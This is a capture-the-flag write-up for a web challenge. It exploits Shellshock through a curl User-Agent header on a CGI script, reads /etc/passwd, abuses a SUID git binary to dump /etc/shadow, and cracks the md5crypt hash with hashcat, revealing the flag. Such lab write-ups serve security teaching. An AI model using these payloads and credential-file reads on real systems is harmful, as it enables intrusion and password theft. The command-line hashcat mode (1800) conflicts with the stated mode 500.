# Status Page

https://stt.uctf.ir

All you're given is a server status page and you're tasked with recovering the password of a user named `m4d0k4`

Flag format: uctf{`m4d0k4's password`}

> Hint: `rockyou.txt` wordlist may work on the password hash.

## Write Up

### Discovering Vulnerablities

Opening up the webpage we're greeted with a very simple HTML page with an iframe pointing to `cgi-bin/uptime.sh` displaying server time and uptime.

```html
<h1>Server Status</h1>
    <iframe id="uptime-iframe" src="/cgi-bin/uptime.sh">
</iframe>
```

Considering the extension it's a shell script of sorts being used as a CGI script. What vulnerablities could pertain to that?

Back in 2014, a family of critical security bugs in the Bash shell were disclosed that can lead to remote code execution. Let's try that.

```
$ curl -A '() { :; }; echo ; echo Vulnerable' https://stt.uctf.ir/cgi-bin/uptime.sh
Vulnerable
Content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Uptime</title>
</head>
<body>
  <p>Mon Aug 21 20:06:19 UTC 2023</p>
  <p> 20:06:19 up  6:30,  0 users,  load average: 0.02, 0.39, 2.95</p>
</body>
</html>
```

After setting `() { :; }; echo ; echo Vulnerable` as the user-agent, Bash accidentally executed what came after `() { :; };` hence the 'Vulnerable' response we get from server.

### Reconnaissance

We're tasked with recovering the password of the user `m4d0k4`, let's see if there's a user named that in the system.

```
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin cat /etc/passwd 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
haproxy:x:100:101:haproxy:/var/lib/haproxy:/bin/false
m4d0k4:x:1000:1000:Madoka Kaname:/home/m4d0k4:/bin/ash
```

Sure enough, there's the `m4d0k4` user. Let's see if we can access the `shadow` file to retrieve the password hash.

```
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin cat /etc/shadow 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
cat: can't open '/etc/shadow': Permission denied
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin stat /etc/shadow 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
  File: /etc/shadow
  Size: 584             Blocks: 8          IO Block: 4096   regular file
Device: 86h/134d        Inode: 2116428     Links: 1
Access: (0640/-rw-r-----)  Uid: (    0/    root)   Gid: (65534/  nobody)
Access: 2023-08-21 20:15:31.938478000 +0000
Modify: 2023-08-21 20:15:31.893478000 +0000
Change: 2023-08-21 20:15:31.895478000 +0000
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin whoami 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
nobody
```

Nope. We do not have enough privilege to read the `shadow` file. We'll have to somehow escalate to `root` to read that file.

### Privilege Escalation

First of all, let's check for a misconfigured `sudo` rights.

```
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin sudo -l -l 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
/opt/bash/bin/bash: sudo: command not found
```

Doesn't seem like `sudo` is even installed.

Let's see if server is misconfigured with any executables that have the [SUID bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) set.

```
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin find /bin /usr/bin -type f -perm -u=s 2>/dev/null' https://stt.uctf.ir/cgi-bin/uptime.sh
/usr/bin/git
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin stat /usr/bin/git 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
  File: /usr/bin/git
  Size: 2779104         Blocks: 5432       IO Block: 4096   regular file
Device: 86h/134d        Inode: 2115270     Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-08-21 15:51:39.280721000 +0000
Modify: 2023-04-25 17:12:46.000000000 +0000
Change: 2023-08-21 15:51:39.118721000 +0000
```

Jackpot! `git` executable has the SUID bit set and is owned by root. We have to somehow get `git` to read `/etc/shadow` for us.

Fortunately for us, `git` can actually be [used to read files and more!](https://gtfobins.github.io/gtfobins/git/)

```
$ curl -A '() { :; }; echo ; PATH=/bin:/usr/bin git diff /dev/null /etc/shadow 2>&1' https://stt.uctf.ir/cgi-bin/uptime.sh
diff --git a/etc/shadow b/etc/shadow
new file mode 100644
index 0000000..560fd89
--- /dev/null
+++ b/etc/shadow
@@ -0,0 +1,29 @@
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+haproxy:!:19590:0:99999:7:::
+m4d0k4:$1$0TIQz3/L$IxXYB.WOJgUvbjFyaFP9R/:19591:0:99999:7:::
```

There it is! md5crypt ($1) hash of `m4d0k4`'s password.

### Cracking Password

Let's try cracking it using `hashcat` and the `rockyou.txt` (preinstalled wordlist on Kali Linux)

```
$ echo '$1$0TIQz3/L$IxXYB.WOJgUvbjFyaFP9R/' > hash.txt
$ hashcat -d 1 -m 1800 -a 0 -O -o result.txt hash.txt rockyou.txt
hashcat (v6.2.6) starting

CUDA API (CUDA 12.2)
====================
* Device #1: NVIDIA GeForce RTX 3050 Laptop GPU, 3314/4095 MB, 16MCU

OpenCL API (OpenCL 3.0 CUDA 12.2.135) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce RTX 3050 Laptop GPU, skipped

OpenCL API (OpenCL 2.1 AMD-APP (3570.0)) - Platform #2 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #3: AMD Radeon(TM) Graphics, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1036 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$0TIQz3/L$IxXYB.WOJgUvbjFyaFP9R/
Time.Started.....: Tue Aug 22 09:30:03 2023 (4 secs)
Time.Estimated...: Tue Aug 22 09:30:07 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1816.6 kH/s (6.50ms) @ Accel:16 Loops:250 Thr:512 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6793151/14344384 (47.36%)
Rejected.........: 108479/6793151 (1.60%)
Restore.Point....: 6659808/14344384 (46.43%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: keeper4e -> jypsey
Hardware.Mon.#1..: Temp: 62c Util: 44% Core:1470MHz Mem:5500MHz Bus:8

Started: Tue Aug 22 00:24:14 2023
Stopped: Tue Aug 22 00:25:52 2023
$ cat result.txt
$1$0TIQz3/L$IxXYB.WOJgUvbjFyaFP9R/:kaznyannyan4
```

There's the password: `kaznyannyan4`

> hashcat parameters used:
> - -d 1          : Use device 1 (RTX 3050 in this case)
> - -m 500        : Crack md5crypt hash
> - -a 0          : Perform dictionary attack
> - -O            : Use optimized kernels
> - -o result.txt : Write result to `result.txt`
> - hash.txt      : File containing hash(es)
> - rockyou.txt   : Wordlist for performing dictionary attack

## Flag

uctf{kaznyannyan4}

or

kaznyannyan4

## Categories

- [X] Web
- [ ] Reverse
- [X] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

## Points

| Warm up | This Challenge | Evil |
| ------- |:--------------:| ----:|
| 25      | 500            | 500  |

## Resources

Only the [website link](https://stt.uctf.ir) should be shared with the contestants.

The [site](site/) directory contains the website data.